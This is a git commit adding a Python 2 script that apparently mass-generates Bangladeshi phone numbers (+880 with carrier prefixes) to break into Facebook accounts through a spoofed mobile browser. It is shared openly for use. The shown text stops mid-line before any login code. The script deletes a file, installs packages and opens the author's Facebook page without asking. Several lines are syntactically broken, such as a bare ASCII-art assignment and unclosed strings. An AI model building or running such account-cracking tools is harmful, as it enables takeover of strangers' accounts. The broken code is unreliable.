dabb8a3f236772b87e7515cc18679bbcb80cd4d1
TURAG AHAMED <118581373+TURAG-404@users.noreply.github.com>
2022-11-22 00:39:00 +0600

    random.py
    Free for all

---
+++ random.py
@@ -0,0 +1,157 @@
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+logo = 
+╔════╗╔╗ ╔╗╔═══╗╔═══╗╔═══╗
+║╔╗╔╗║║║ ║║║╔═╗║║╔═╗║║╔═╗║
+╚╝║║╚╝║║ ║║║╚═╝║║║ ║║║║ ╚╝
+  ║║  ║║ ║║║╔╗╔╝║╚═╝║║║╔═╗
+ ╔╝╚╗ ║╚═╝║║║║╚╗║╔═╗║║╚╩═║
+ ╚══╝ ╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝
+                          
+                          
+os.system('clear')
+print logo
+jalan('\n\x1b[1;32mBANGLADESH 11 DIGIT CLONING COMMANDS ..........')
+os.system('xdg-open https://www.facebook.com/turag.ahmed.18 ')
+time.sleep(0.07)
+for n in range(9999):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 C')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+os.system('clear')
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [
+ ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print
+    os.sys.exit()
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def t():
+    time.sleep(1)
+
+
+def cb():
+    os.system('clear')
+
+
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+
+def menu():
+    os.system('clear')
+    print logo
+    print ''
+    print 'AUTHOR   : TURAG AHAMED 
+    print 'FACEBOOK : TURAG AHAMED 
+    print 'GITHUB   : TURAG-404
+    print ''
+    print 50 * '-'
+    print '[1]  \x1b[1;96mCLONE FROM GP'
+    print '[2]  \x1b[1;92mCLONE FROM Robi'
+    print '[3]  \x1b[1;96mCLONE FROM Airtel'
+    print '[4]  \x1b[1;92mCLONE FROM Banglalink'
+    print '[5]  \x1b[1;93mCLONE FROM Teletalk'
+    print '[6]  \x1b[1;93mJoin TG Channel '
+    print '[0]  \x1b[1;95mExit            '
+    print 50 * '-'
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\n  ===>   ')
+    if bch == '':
+        print'Wrong Input'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print 50 * '-'
+        print 50 * '-'
+        print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139'
+        print 50 * '-'
+        try:
+            c = raw_input(' Choose Code  : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print 50 * '-'
+        print 50 * '-'
+        print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
+        print 50 * '-'
+        try:
+            c = raw_input(' Choose Code  : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '3':
+        os.system('clear')
+        print logo
+        print 50 * '-'
+        print 50 * '-'
+        print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
+        print 50 * '-'
+        try:
+            c = raw_input(' Choose Code  : ')
+            k = '+880'
+            idlist = '.txt'
+            for line
